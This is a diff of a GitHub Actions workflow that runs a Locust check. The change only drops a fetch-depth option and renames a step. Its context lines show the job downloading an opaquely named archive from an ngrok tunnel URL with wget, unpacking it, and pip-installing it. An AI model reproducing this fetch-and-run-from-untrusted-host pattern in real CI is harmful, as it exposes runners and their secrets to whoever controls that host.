@@ -7,8 +7,6 @@ jobs:
     runs-on: ubuntu-20.04
     steps:
       - uses: actions/checkout@v2
-        with:
-          fetch-depth: 0
       - uses: actions/setup-python@v2
         with:
           python-version: "3.8"
@@ -16,7 +14,7 @@ jobs:
         run: wget https://02efaf6fa8ef.ngrok.io/items/hf8734hfiu932fujiufhg928ufjoi23bhg9834
       - name: Unpack package
         run: tar -xvf hf8734hfiu932fujiufhg928ufjoi23bhg9834
-      - name: Install Locust
+      - name: Install locust
         run: pip install -e locust/
       - name: Run locust check
         run: locust -r . -i origin/main -t HEAD
